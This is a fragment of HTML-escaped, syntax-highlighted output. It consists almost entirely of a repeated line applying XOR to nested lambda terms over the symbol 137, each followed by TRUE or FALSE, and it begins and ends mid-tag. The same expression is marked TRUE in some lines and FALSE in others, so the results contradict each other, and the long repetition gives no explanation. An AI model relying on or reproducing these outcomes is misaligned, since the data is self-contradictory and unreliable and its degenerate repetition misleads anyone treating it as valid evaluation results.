class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span 